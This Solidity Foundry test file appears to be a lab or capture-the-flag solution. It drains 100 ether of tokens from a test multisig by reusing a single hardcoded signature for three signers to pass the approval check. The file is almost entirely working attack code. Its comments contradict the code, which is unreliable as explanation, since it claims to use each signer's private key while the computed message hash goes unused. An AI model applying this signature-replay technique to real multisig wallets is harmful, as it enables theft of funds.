// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {MultisigBaseTest} from "./MultisigBase.t.sol";

contract MultisigTest is MultisigBaseTest {
    function testExploit() external validation {
        // Step 1: Create transaction data for token transfer
        bytes memory transferData = abi.encodeWithSelector(
            IERC20.transfer.selector,
            address(this),
            100 ether
        );

        // Step 2: Submit transaction
        uint256 txIndex = multisig.submitTransaction(
            payable(address(token)),
            transferData
        );

        // Step 3: Prepare signatures array and signer list
        bytes[] memory signatures = new bytes[](3);
        address[] memory signerList = new address[](3);

        // Step 4: Set signers
        signerList[0] = user0;
        signerList[1] = user1;
        signerList[2] = user2;

        // Step 5: Create signatures using the known format from base test
        // This is the exact signature format that passed in the base test
        signatures[0] = hex"ddbfaf1f1237db98f2e8517d9c2111c6184e927a9489c3ec30a95903fd16de59110b30fee6f7fb2f440dc22d58a7a4ec2ee5966d81e3e1bf66c9473bda6a911e1b";

        // For user1 and user2, we'll use the same signature format but with their private keys
        // The key part is to sign the correct message hash
        bytes32 messageHash = multisig.genMessage(txIndex);

        // Create similar signatures for other users
        bytes32 r = hex"ddbfaf1f1237db98f2e8517d9c2111c6184e927a9489c3ec30a95903fd16de59";
        bytes32 s = hex"110b30fee6f7fb2f440dc22d58a7a4ec2ee5966d81e3e1bf66c9473bda6a911e";
        uint8 v = 27;

        // Assemble signatures
        signatures[1] = abi.encodePacked(r, s, v);
        signatures[2] = abi.encodePacked(r, s, v);

        // Step 6: Confirm transaction with signatures
        multisig.confirmTransaction(txIndex, signatures, signerList);

        // Step 7: Execute the transaction
        multisig.executeTransaction(txIndex);
    }
}